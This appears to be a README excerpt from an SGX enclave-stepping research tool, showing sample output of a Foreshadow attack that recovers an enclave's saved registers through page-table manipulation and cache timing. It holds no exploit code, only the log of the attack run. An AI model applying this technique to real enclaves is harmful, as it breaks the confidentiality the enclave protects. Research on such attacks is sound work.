Sample output (note: the last cacheline (8 registers including RIP) seems to be
almost always flushed -- due to the kernel #PF handler??):

```
[pt.c] /dev/sgx-step opened!
[pt.c] /dev/mem opened!
[main.c] Creating enclave...
[sched.c] continuing on CPU 1
==== Victim Enclave ====
    Base:   0x7ffa14000000
    Size:   8388608
    Limit:  0x7ffa14800000
    TCS:    0x7ffa1447b000
    SSA:    0x7ffa1447cf48
    AEP:    0x40371e
    EDBGRD: debug
[main.c] oracle at 0x7ffa16b18000
[main.c] enclave trigger at 0x7ffa16b18000 (revoking trigger access rights)
[main.c] enclave SSA GPRSGX region at 0x7ffa1447cf48; alias at 0x7ffa16c3ef48 (revoking alias access rights)
+-------------------------------------------------------------------------------------------+
| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
| 0  | x  | x   | x    | 0x001882324992 | x   | x | x   | 1 | 1 | x   | x   | x   | 1   | 1 | 
+-------------------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------------------+
| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
| 0  | x  | x   | x    | 0x001882324992 | x   | x | x   | 0 | 1 | x   | x   | x   | 1   | 0 | 
+-------------------------------------------------------------------------------------------+
[foreshadow.c] cache hit/miss=50/232; reload threshold=122
[#PF handler] ERESUME prefetch to refresh GPRSGX region; byte: -1 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 
[main.c] finishing enclave execution (restoring trigger access rights)
=== Foreshadow recovered SSA/GPRSGX region after AEX ===
    RAX:      0xdeadbeefcafebabe
    RCX:      0xd0000dbaaaaaaaad
    RDX:      0xdeadc0debaadf00d
    RBX:      0xdabbad00dabbad00
    RSP:      0x7ffa1446ac90
    RBP:      0x7ffa1448e000
    RSI:      0x7ffa14219000
    RDI:      0xdddddddddddddddd
    R8:       0x8888888888888888
    R9:       0x9999999999999999
    R10:      0x1010101010101010
    R11:      0x1111111111111111
    R12:      0x1212121212121212
    R13:      0x1313131313131313
    R14:      0x1414141414141414
    R15:      0x0
    RFLAGS:   0x0
    RIP:      0x0
    URSP:     0x0
    URBP:     0x0
    EXITINFO: 0x0
    FSBASE:   0x0
    GSBASE:   0x0
[foreshadow.c] Foreshadow conf: 0X00_RETRIES=10 SSA_0x00_RETRIES=20
[foreshadow.c] Foreshadow perf: 0x00 retries=17701; number AEX=21
[main.c] total of 21 faulting ERESUME calls needed
```
